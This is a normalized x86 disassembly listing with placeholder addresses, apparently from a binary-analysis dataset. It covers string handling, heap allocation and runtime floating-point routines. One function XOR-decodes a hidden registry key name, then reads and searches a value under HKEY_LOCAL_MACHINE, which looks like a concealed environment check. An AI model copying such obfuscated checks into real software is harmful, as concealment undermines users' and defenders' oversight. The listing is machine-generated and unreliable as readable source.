push ebx
push 0x65
push esi
call sub_1007f310
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ ebp + 0x14 ]
sub eax esi
push edx
mov edx [ ebp + 0x10 ]
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push esi
push ecx
push edx
lea eax [ esp + 0x44 ]
push eax
push edi
call sub_1001e850
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x40 ]
add esp 0x1c
push ecx
mov [ ebp + 0x14 ] edx
mov edx [ esp + 0x3c ]
mov ecx [ eax + 0x4 ]
push edx
mov edx [ eax ]
push ecx
push edx
lea eax [ esp + 0x40 ]
push eax
push edi
call sub_10024610
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x5c ]
mov [ ebp + 0x14 ] edx
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
add esp 0x18
call edx
mov ecx [ ebp + 0x10 ]
movzx eax ax
push 0x1
push eax
mov eax [ ebp + 0x14 ]
push eax
push ecx
lea edx [ esp + 0x40 ]
push edx
push edi
call sub_10024610
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x54 ]
push ecx
mov [ ebp + 0x14 ] edx
mov edx [ esp + 0x54 ]
mov ecx [ eax + 0x4 ]
push edx
mov edx [ eax ]
push ecx
push edx
lea eax [ esp + 0x58 ]
push eax
push edi
call sub_10024610
mov ecx [ eax ]
add esi ebx
add esp 0x30
sub [ esp + 0x10 ] ebx
mov ebx [ esp + 0x10 ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x14 ] edx
cmp [ esp + 0x1c ] 0x0
jbe r-xdata
mov edx [ esp + 0x14 ]
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push eax
push ecx
push edx
lea eax [ esp + 0x40 ]
push eax
push edi
call sub_10024610
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x14 ] edx
jmp r-xdata
sub ecx eax
mov [ esp + 0x14 ] ecx
jmp r-xdata
cmp [ esp + 0x14 ] 0x0
jne r-xdata
mov eax [ esp + 0x18 ]
push 0x30
push eax
lea ecx [ esp + 0x58 ]
call sub_10042a70
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push eax
push ebx
push esi
push ecx
push edx
lea eax [ esp + 0x44 ]
push eax
push edi
call sub_1001e850
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x34 ]
add esp 0x1c
push ecx
mov [ ebp + 0x14 ] edx
mov edx [ esp + 0x3c ]
mov ecx [ eax + 0x4 ]
push edx
mov edx [ eax ]
push ecx
push edx
lea eax [ esp + 0x40 ]
push eax
push edi
call sub_10024610
mov ecx [ eax ]
mov edx [ esp + 0x58 ]
mov esi [ esp + 0x60 ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor ebx ebx
mov [ edx + 0x20 ] ebx
mov [ edx + 0x24 ] ebx
mov edx [ esp + 0x2c ]
push edx
mov edx [ ebp + 0x1c ]
push edx
push eax
push ecx
push esi
push edi
mov [ ebp + 0x14 ] eax
call sub_10024610
mov edi 0x10
add esp 0x30
cmp [ esp + 0x64 ] edi
jb r-xdata
mov edx [ ebp + 0x14 ]
sub eax esi
lea ebx [ eax + 0x1 ]
mov eax [ esp + 0x20 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebx - 0x1 ]
push ecx
push esi
push edx
push eax
lea ecx [ esp + 0x44 ]
push ecx
push edi
call sub_1001e850
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ esp + 0x34 ]
add esp 0x1c
push edx
mov [ ebp + 0x14 ] ecx
mov ecx [ esp + 0x3c ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push ecx
push edx
push eax
lea ecx [ esp + 0x40 ]
push ecx
push edi
call sub_10024610
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ esp + 0x58 ]
add esp 0x18
test [ edx + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov [ esp + 0x18 ] 0x0
mov ecx r--data
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
push edx
push eax
lea ecx [ esp + 0x40 ]
push ecx
push edi
call sub_10024610
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push 0x1
push esi
push eax
push ecx
lea edx [ esp + 0x40 ]
push edx
push edi
call sub_10003150
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
inc esi
dec ebx
mov [ ebp + 0x14 ] edx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x2c ] 0x0
add esp 0x18
mov eax [ edx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov edx [ esp + 0x18 ]
push 0x30
push edx
sub ebx esi
push ebx
lea ecx [ esp + 0x5c ]
call sub_100502f0
mov ecx [ esp + 0x24 ]
push 0x30
push ecx
lea ecx [ esp + 0x58 ]
call sub_10042a70
mov [ esp + 0x24 ] 0x0
mov ebx [ esp + 0x14 ]
push 0x30
test ebx ebx
jne r-xdata
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] ebx
mov [ esp + 0x50 ] bl
cmp [ esp + 0x80 ] edi
jb r-xdata
mov eax [ esp + 0x50 ]
push eax
call sub_1000a86e
add esp 0x4
mov edx [ eax ]
push 0x1
push ecx
mov ecx [ eax + 0x4 ]
push ecx
push edx
lea eax [ esp + 0x40 ]
push eax
push edi
call sub_10003150
mov ecx [ eax ]
add esi ebx
add esp 0x18
sub [ esp + 0x10 ] ebx
mov ebx [ esp + 0x10 ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x14 ] edx
mov ecx r--data
mov ecx [ esp + 0x40 ]
sub ebx esi
push ecx
lea edx [ ebx + 0x1 ]
push edx
lea ecx [ esp + 0x5c ]
call sub_100502f0
mov eax [ esp + 0x24 ]
push 0x30
push eax
push ebx
lea ecx [ esp + 0x5c ]
call sub_100502f0
mov [ esp + 0x3c ] 0x0
mov eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x58 ]
call sub_10042a70
jmp r-xdata
mov eax esi
mov ecx [ esp + 0x90 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x78 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0x6c ]
push ecx
call sub_1000a86e
add esp 0x4
cmp [ esp + 0x64 ] eax
mov eax [ esp + 0x50 ]
jae r-xdata
lea ebx [ esp + 0x6c ]
mov ebx [ esp + 0x6c ]
mov eax 0x10
mov [ esp + 0x24 ] 0x0
cmp [ esp + 0x80 ] eax
jae r-xdata
lea ecx [ esp + 0x2c ]
push ecx
push eax
call sub_1007f530
mov esi eax
mov al [ ebx ]
add esp 0x8
cmp al 0x7f
je r-xdata
lea eax [ esp + 0x50 ]
cmp [ esp + 0x64 ] 0x10
mov esi [ esp + 0x50 ]
jae r-xdata
test al al
jle r-xdata
mov eax [ esp + 0x60 ]
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x10 ] eax
mov ebx eax
lea esi [ esp + 0x50 ]
mov edx esi
sub edx [ esp + 0x1c ]
movsx eax al
cmp eax edx
jae r-xdata
push 0x0
sub esi eax
push 0x1
push esi
lea ecx [ esp + 0x5c ]
call sub_100502f0
cmp [ ebx + 0x1 ] 0x0
jle r-xdata
mov al [ ebx ]
cmp al 0x7f
jne r-xdata
inc ebx
sub_10040140
push ebp
mov ebp esp
sub esp 0x2b4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff82
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x19
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x48 ]
push edx
push 0x80000002
mov [ ebp - 0x16 ] ax
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x2c
call sub_10037e30
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x2ac ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
movzx edx ax
mov eax edx
push edi
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x2a8 ]
[ edi ]
lea edx [ ebp - 0x2b4 ]
mov eax 0xa
mov [ ebp - 0x2b0 ] 0x206
call sub_10037e30
lea eax [ ebp - 0x2b0 ]
push eax
mov eax [ ebp - 0x2ac ]
lea ecx [ ebp - 0x2a8 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
pop edi
test eax eax
je r-xdata
lea edx [ ebp - 0x2a8 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x14 ]
mov eax 0x22
call sub_10037e30
mov eax edx
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
call sub_1000b388
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x2ac ]
push ecx
jmp r-xdata
mov eax [ ebp - 0x2ac ]
push eax
mov edx [ ebp - 0x2ac ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
call [ RegCloseKey@IAT ]
sub_100402be
mov edi edi
push esi
push 0x4
push 0x20
call sub_100579de
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_100402f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084fd3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_1006f671
mov eax [ esi + 0x18 ]
add esp 0x4
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x18 ] 0x0
mov [ esi ] r--data
je r-xdata
push eax
call sub_1001b2d2
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10040370
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov edx [ ecx + 0x20 ]
sub edx [ ecx + 0x1c ]
mov eax 0x38e38e39
imul edx
sar edx 0x3
push esi
mov eax edx
shr eax 0x1f
push edi
mov edi [ ecx + 0x1c ]
mov ecx [ ecx + 0x20 ]
lea esi [ edx + eax - 0x1 ]
sub ecx edi
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx esi
ja r-xdata
lea edx [ esi + esi * 8 ]
mov eax [ edi + edx * 4 + 0x1c ]
lea esi [ edi + edx * 4 + 0x1c ]
mov edi [ ebp + 0x10 ]
test eax eax
jne r-xdata
push r--data
call sub_100651be
mov ecx [ esi + 0x4 ]
add ecx edi
push ecx
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push edi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ esi + 0x4 ]
add eax [ esi ]
push edi
push edx
push eax
call sub_1007f580
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10040420
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
jne r-xdata
cmp edi 0x71c71c7
jbe r-xdata
xor al al
retn
mov ecx edi
call sub_1006d880
lea ecx [ edi + edi * 8 ]
lea edx [ eax + ecx * 4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edx
mov al 0x1
retn
push r--data
call sub_10030594
sub_1004045b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100098f5
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_10040490
push ebp
mov ebp esp
push 0xffffffff
push sub_10087f7b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov esi [ edx + 0x4 ]
add esi edi
call sub_10025690
mov eax [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] ebx
call sub_10020630
mov [ esi + 0x40 ] al
cmp [ esi + 0x38 ] ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ edi + edx + 0x10 ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
or eax 0x4
or eax 0x4
push ebx
mov ecx esi
call sub_10039ae0
sub_10040535
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10002d9d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_100405d8
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000bbcf
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1004067f
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10040bd0
push esi
mov esi ecx
cmp [ esi + 0xb8 ] 0x0
jne r-xdata
mov eax [ esi + 0x6c ]
push ebx
push edi
push r--data
xor edi edi
lea ecx [ esi + 0x5c ]
call sub_100449d0
test eax eax
jne r-xdata
mov eax 0x64
pop esi
retn
mov edx 0x8
cmp [ esi + 0x70 ] edx
jb r-xdata
cmp [ esi + 0x54 ] 0x8
lea eax [ esi + 0x40 ]
jb r-xdata
lea ecx [ esi + 0x5c ]
mov ecx [ esi + 0x5c ]
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ esi + 0xc8 ]
call eax
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x0
push ecx
mov ecx [ esi + 0xc8 ]
push 0x3
push eax
call ecx
mov eax [ eax ]
cmp [ esi + 0x54 ] edx
lea eax [ esi + 0x40 ]
jb r-xdata
mov ecx eax
mov [ esi + 0xc0 ] eax
test ecx ecx
jne r-xdata
